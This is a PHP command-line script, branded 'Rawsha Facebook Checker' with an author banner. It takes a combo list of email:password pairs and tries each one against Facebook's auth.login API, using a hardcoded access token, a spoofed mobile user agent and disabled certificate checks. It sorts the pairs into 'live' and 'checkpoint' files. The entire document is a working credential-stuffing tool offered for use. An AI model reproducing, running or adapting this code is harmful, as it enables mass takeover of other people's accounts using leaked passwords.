<?php

$Red = "\e[91m";
$Yellow = "\e[33m";
$Green = "\e[32m";
$LightGreen = "\e[92m";
$Blue = "\e[34m";
$White = "\e[97m";


echo "$Red+ /////////////////////////////////////////////////+\n";
echo "$Green _____                    _                      
|  __ \                  | |                      
| |__) |__ ___      _____| |__   __ _ _ __   __ _
|  _  // _` \ \ /\ / / __| '_ \ / _` | '_ \ / _` |
| | \ \ (_| |\ V  V /\__ \ | | | (_| | | | | (_| |
|_|  \_\__,_| \_/\_/ |___/_| |_|\__,_|_| |_|\__,_|\n\n";
echo "$Red";
echo "+ /////////////////////////////////////////////////+\n";
echo "$White     Rawsha Facebook Checker\n";
echo "$Red+ //////////////////////////////+\n";
echo "$LightGreen Author : Mohamed Reda EL-Naggar \n Facebook : fb.com/medo.rawshana\n";
echo "$Red+ //////////////////////////////+\n";


if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $cokot = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($cokot as $list) {
            $cut = explode(":", $list);
            tryAccount($cut[0], $cut[1]);
          
        }
    }else die("File doesn't exist!");
}else die("$Yellow Usage: php run.php combo.txt \n");
function tryAccount($email, $password) {
    $data = array(
"access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $password,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($data as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $data['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $result = json_decode(curl_exec($ch));
   
    sleep(1);

echo "\e[97m =>\e[97m ";
    $emailandpassword =  $email.":".$password;
    if(isset($result->access_token)) { 
        echo $emailandpassword." \e[92m [LIVE]".PHP_EOL;
        file_put_contents("live.txt", $emailandpassword.PHP_EOL, FILE_APPEND);
    }elseif($result->error_code == 405 || preg_match("/User must verify their account/i", $result->error_msg)) {
echo  $emailandpassword."\e[33m [CHECKPOINT]\e[97m".PHP_EOL;
        file_put_contents("checkpoint.txt", $emailandpassword.PHP_EOL, FILE_APPEND);
    }else echo  $emailandpassword."\e[91m  [DEAD]\e[97m".PHP_EOL;
}